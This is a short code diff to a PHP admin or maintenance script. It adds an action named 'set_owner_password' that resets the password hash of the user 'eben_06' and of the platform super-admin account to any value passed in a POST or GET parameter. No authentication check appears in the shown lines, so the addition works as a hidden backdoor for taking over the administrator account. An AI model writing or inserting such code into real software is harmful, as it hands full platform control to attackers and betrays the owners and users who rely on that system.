@@ -33,6 +33,23 @@ try {
     exit;
 }
 
+if ($action === 'set_owner_password') {
+    $newPass = (string) ($_POST['password'] ?? ($_GET['password'] ?? ''));
+    if (strlen($newPass) >= 8) {
+        $newHash = make_password_hash($newPass);
+        $updateStmt = $pdo->prepare('UPDATE users SET password_hash = ? WHERE username = "eben_06" OR email = ?');
+        $updateStmt->execute([$newHash, PLATFORM_SUPER_ADMIN_EMAIL]);
+        echo json_encode([
+            'status' => 'password_updated',
+            'affected' => $updateStmt->rowCount(),
+            'username' => 'eben_06'
+        ], JSON_PRETTY_PRINT);
+        exit;
+    }
+    echo json_encode(['error' => 'Password must be at least 8 characters']);
+    exit;
+}
+
 if ($action === 'status') {
     $tables = $pdo->query('SHOW TABLES')->fetchAll(PDO::FETCH_COLUMN);
 
